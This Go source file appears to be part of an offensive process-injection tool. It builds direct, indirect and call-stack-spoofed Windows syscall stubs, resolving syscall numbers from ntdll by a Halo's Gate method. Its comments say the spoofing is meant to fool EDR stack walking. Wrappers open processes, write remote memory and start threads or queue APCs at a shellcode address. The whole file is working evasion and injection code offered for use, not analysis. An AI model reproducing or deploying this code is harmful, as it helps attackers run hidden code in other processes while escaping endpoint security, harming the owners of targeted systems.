package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ── Syscall Manager ──
// Caches resolved SSNs and built stubs to avoid re-parsing ntdll on every inject.

type syscallManager struct {
	stubs     map[string]uintptr
	retGadget uintptr // cached "ret" gadget in ntdll (for call stack spoofing)
}

func newSyscallManager() *syscallManager {
	return &syscallManager{stubs: make(map[string]uintptr)}
}

// getStub returns a direct syscall stub (no call stack spoofing).
func (sm *syscallManager) getStub(funcName string) (uintptr, error) {
	if addr, ok := sm.stubs[funcName]; ok {
		return addr, nil
	}
	ssn, err := findSyscallNumHalo(funcName)
	if err != nil {
		ssn, err = findSyscallNum(funcName)
		if err != nil {
			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
		}
	}
	code := []byte{
		0x4C, 0x8B, 0xD1,                                               // mov r10, rcx
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24), // mov eax, SSN
		0x0F, 0x05,                                                     // syscall
		0xC3,                                                           // ret
	}
	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc %s stub: %w", funcName, err)
	}
	sm.stubs[funcName] = addr
	return addr, nil
}

// getSpoofedStub returns a call-stack-spoofed indirect syscall stub.
// The stub pushes a fake return address (inside ntdll's .text) before
// jumping to the syscall;ret gadget in ntdll, so EDR stack walking
// sees the return originating from ntdll rather than our allocated memory.
func (sm *syscallManager) getSpoofedStub(funcName string) (uintptr, error) {
	cacheKey := "spoofed:" + funcName
	if addr, ok := sm.stubs[cacheKey]; ok {
		return addr, nil
	}

	ssn, err := findSyscallNumHalo(funcName)
	if err != nil {
		ssn, err = findSyscallNum(funcName)
		if err != nil {
			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
		}
	}

	// Find syscall;ret gadget in ntdll
	gadget, err := findSyscallGadget()
	if err != nil {
		return 0, err
	}

	// Find a "ret" (0xC3) gadget in ntdll for the fake return address
	fakeRet, err := findRetGadget()
	if err != nil {
		return 0, err
	}

	// Call-stack-spoofed stub:
	//   48 B8 <addr>         mov rax, fake_ret_addr (ntdll ret gadget)
	//   50                    push rax
	//   4C 8B D1              mov r10, rcx
	//   B8 <SSN>              mov eax, SSN
	//   FF 25 00 00 00 00     jmp [rip+0]
	//   <gadget addr>         .quad syscall;ret gadget address
	code := make([]byte, 0, 8+1+3+5+6+8)
	code = append(code, 0x48, 0xB8) // mov rax, imm64
	code = append(code, byte(fakeRet), byte(fakeRet>>8), byte(fakeRet>>16), byte(fakeRet>>24),
		byte(fakeRet>>32), byte(fakeRet>>40), byte(fakeRet>>48), byte(fakeRet>>56))
	code = append(code, 0x50) // push rax
	code = append(code, 0x4C, 0x8B, 0xD1) // mov r10, rcx
	code = append(code, 0xB8,
		byte(ssn), byte(ssn>>8), byte(ssn>>16), byte(ssn>>24)) // mov eax, SSN
	code = append(code, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00) // jmp [rip+0]
	code = append(code, byte(gadget), byte(gadget>>8), byte(gadget>>16), byte(gadget>>24),
		byte(gadget>>32), byte(gadget>>40), byte(gadget>>48), byte(gadget>>56))

	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc spoofed %s stub: %w", funcName, err)
	}
	sm.stubs[cacheKey] = addr
	return addr, nil
}

// getIndirectStub returns an indirect syscall stub via a syscall gadget (no spoofing).
func (sm *syscallManager) getIndirectStub(funcName string) (uintptr, error) {
	cacheKey := "indirect:" + funcName
	if addr, ok := sm.stubs[cacheKey]; ok {
		return addr, nil
	}
	ssn, err := findSyscallNumHalo(funcName)
	if err != nil {
		ssn, err = findSyscallNum(funcName)
		if err != nil {
			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
		}
	}
	gadget, err := findSyscallGadget()
	if err != nil {
		return 0, err
	}
	code := []byte{
		0x4C, 0x8B, 0xD1, // mov r10, rcx
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24), // mov eax, SSN
		0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [rip+0]
	}
	code = append(code, byte(gadget), byte(gadget>>8), byte(gadget>>16), byte(gadget>>24),
		byte(gadget>>32), byte(gadget>>40), byte(gadget>>48), byte(gadget>>56))

	addr, err := allocateLocalRX(code)
	if err != nil {
		return 0, fmt.Errorf("alloc indirect %s stub: %w", funcName, err)
	}
	sm.stubs[cacheKey] = addr
	return addr, nil
}

func (sm *syscallManager) freeStubs() {
	for name, addr := range sm.stubs {
		procVirtualFree.Call(addr, 0, 0x8000)
		delete(sm.stubs, name)
	}
}

// findRetGadget finds a "ret" (0xC3) instruction in ntdll .text section
// to use as a fake return address for call stack spoofing.
func findRetGadget() (uintptr, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	ntHdrOffset := uintptr(dos.eLfanew)
	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + uintptr(unsafe.Offsetof(ntHdr.optionalHeader)) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))

	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		name := string(sec.name[:])
		if name == ".text" {
			start := base + uintptr(sec.virtualAddress)
			size := uintptr(sec.sizeOfRawData)
			if size == 0 {
				size = uintptr(sec.virtualSize)
			}
			if size > 1024*1024 {
				size = 1024 * 1024
			}
			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
			// Search for 0xC3 (ret) at a >= 4 byte aligned offset
			for i := 8; i < len(text)-1; i++ {
				if text[i] == 0xC3 && (i%4 == 0) {
					return start + uintptr(i), nil
				}
			}
			// Fallback: any 0xC3
			for i := 0; i < len(text)-1; i++ {
				if text[i] == 0xC3 {
					return start + uintptr(i), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("ret gadget not found in ntdll")
}

// ── Halo's Gate: find SSN with verification ──

func findSyscallNumHalo(funcName string) (uint32, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}
	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
	if exportDir.virtualAddress == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))

	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))

	for i := uint32(0); i < exp.numberOfNames; i++ {
		namePtr := base + uintptr(nameArray[i])
		var name string
		for j := 0; ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			name += string(c)
		}
		if name == funcName {
			ord := ordArray[i]
			funcRVA := funcArray[ord]
			funcAddr := base + uintptr(funcRVA)

			code := (*[64]byte)(unsafe.Pointer(funcAddr))[:]
			for k := 0; k < len(code)-5; k++ {
				if code[k] == 0xB8 {
					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
						if code[j] == 0x0F && code[j+1] == 0x05 {
							if j+2 < len(code) && code[j+2] == 0xC3 {
								return ssn, nil
							}
							continue
						}
					}
					return 0, fmt.Errorf("Halo's Gate: valid syscall+ret not found in %s", funcName)
				}
			}
			return 0, fmt.Errorf("Halo's Gate: no mov eax pattern in %s", funcName)
		}
	}
	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
}

func findSyscallGadget() (uintptr, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}
	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	ntHdrOffset := uintptr(dos.eLfanew)
	firstSection := (*imageSectionHeader)(unsafe.Pointer(base + ntHdrOffset + uintptr(unsafe.Offsetof(ntHdr.optionalHeader)) + uintptr(ntHdr.fileHeader.sizeOfOptionalHeader)))

	for i := uint16(0); i < ntHdr.fileHeader.numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(imageSectionHeader{})))
		name := string(sec.name[:])
		if name == ".text" {
			start := base + uintptr(sec.virtualAddress)
			size := uintptr(sec.sizeOfRawData)
			if size == 0 {
				size = uintptr(sec.virtualSize)
			}
			if size > 1024*1024 {
				size = 1024 * 1024
			}
			text := (*[1 << 20]byte)(unsafe.Pointer(start))[:size]
			for i := 0; i < len(text)-2; i++ {
				if text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3 {
					return start + uintptr(i), nil
				}
			}
		}
	}
	return 0, fmt.Errorf("syscall;ret gadget not found in ntdll")
}

// ── High-Level Syscall Wrappers ──
// These wrappers use the spoofed (call-stack-spoofed) stubs by default.

func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr uintptr) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtCreateThreadEx")
	if err != nil {
		// Fallback to direct if spoofed fails
		stub, err = sm.getStub("NtCreateThreadEx")
		if err != nil {
			return 0, err
		}
	}
	var hThread uintptr
	r1, _, _ := syscall.Syscall9(stub, 8,
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,
		0,
		hProc,
		shellcodeAddr,
		0,
		0,
		0,
		0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtCreateThreadEx failed: 0x%X", r1)
	}
	return hThread, nil
}

func syscallNtAllocateVirtualMemory(sm *syscallManager, hProc uintptr, size uintptr, protect uint32) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtAllocateVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtAllocateVirtualMemory")
		if err != nil {
			return 0, err
		}
	}
	var baseAddr uintptr
	var regionSize uintptr = size
	r1, _, _ := syscall.Syscall6(stub, 6,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(protect),
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X (size=%d)", r1, size)
	}
	return baseAddr, nil
}

func syscallNtFreeVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr) error {
	stub, err := sm.getSpoofedStub("NtFreeVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtFreeVirtualMemory")
		if err != nil {
			return err
		}
	}
	var regionSize uintptr = 0
	r1, _, _ := syscall.Syscall6(stub, 4,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(0x8000), // MEM_RELEASE
		0, 0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%X", r1)
	}
	return nil
}

func syscallNtProtectVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uintptr, size uintptr, newProtect uint32) (uint32, error) {
	stub, err := sm.getSpoofedStub("NtProtectVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtProtectVirtualMemory")
		if err != nil {
			return 0, err
		}
	}
	var regionSize uintptr = size
	var oldProtect uint32
	r1, _, _ := syscall.Syscall6(stub, 5,
		hProc,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
		0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
	}
	return oldProtect, nil
}

func syscallNtWriteVirtualMemory(sm *syscallManager, hProc uintptr, destAddr uintptr, data []byte) error {
	stub, err := sm.getSpoofedStub("NtWriteVirtualMemory")
	if err != nil {
		stub, err = sm.getStub("NtWriteVirtualMemory")
		if err != nil {
			return err
		}
	}
	var bytesWritten uintptr
	r1, _, _ := syscall.Syscall6(stub, 5,
		hProc,
		destAddr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
	}
	return nil
}

func syscallNtOpenProcess(sm *syscallManager, desiredAccess uint32, pid uint32) (uintptr, error) {
	stub, err := sm.getSpoofedStub("NtOpenProcess")
	if err != nil {
		stub, err = sm.getStub("NtOpenProcess")
		if err != nil {
			return 0, err
		}
	}
	var hProc uintptr
	objAttr := struct {
		length          uint32
		rootDirectory   uintptr
		objectName      uintptr
		attributes      uint32
		securityDescr   uintptr
		securityQoS     uintptr
	}{}
	objAttr.length = uint32(unsafe.Sizeof(objAttr))

	r1, _, _ := syscall.Syscall6(stub, 4,
		uintptr(unsafe.Pointer(&hProc)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(pid),
		0, 0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed: 0x%X", r1)
	}
	return hProc, nil
}

func syscallNtClose(sm *syscallManager, handle uintptr) error {
	stub, err := sm.getSpoofedStub("NtClose")
	if err != nil {
		stub, err = sm.getStub("NtClose")
		if err != nil {
			return err
		}
	}
	r1, _, _ := syscall.Syscall(stub, 1, handle, 0, 0)
	if r1 != 0 {
		return fmt.Errorf("NtClose failed: 0x%X", r1)
	}
	return nil
}

func syscallNtResumeThread(sm *syscallManager, hThread uintptr) error {
	stub, err := sm.getSpoofedStub("NtResumeThread")
	if err != nil {
		stub, err = sm.getStub("NtResumeThread")
		if err != nil {
			return err
		}
	}
	var suspendCount uint32
	r1, _, _ := syscall.Syscall(stub, 2, hThread, uintptr(unsafe.Pointer(&suspendCount)), 0)
	if r1 != 0 {
		return fmt.Errorf("NtResumeThread failed: 0x%X", r1)
	}
	return nil
}

func syscallNtQueueApcThread(sm *syscallManager, hThread uintptr, apcRoutine uintptr, param uintptr) error {
	stub, err := sm.getSpoofedStub("NtQueueApcThread")
	if err != nil {
		stub, err = sm.getStub("NtQueueApcThread")
		if err != nil {
			return err
		}
	}
	r1, _, _ := syscall.Syscall6(stub, 4,
		hThread,
		apcRoutine,
		param,
		0,
		0, 0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtQueueApcThread failed: 0x%X", r1)
	}
	return nil
}

// syscallNtDelayExecution resolves NtDelayExecution once and calls it.
// delayInterval is in 100-ns units; negative = relative wait.
// Returns true if the wait was satisfied, false if alertable and APC delivered.
func syscallNtDelayExecution(sm *syscallManager, alertable bool, delayInterval *int64) (bool, error) {
	stub, err := sm.getSpoofedStub("NtDelayExecution")
	if err != nil {
		stub, err = sm.getStub("NtDelayExecution")
		if err != nil {
			return false, err
		}
	}
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	r1, _, _ := syscall.Syscall(stub, 2,
		alert,
		uintptr(unsafe.Pointer(delayInterval)),
		0,
	)
	// STATUS_SUCCESS = 0, STATUS_USER_APC = 0xC0 (alertable wait interrupted)
	return r1 == 0, nil
}
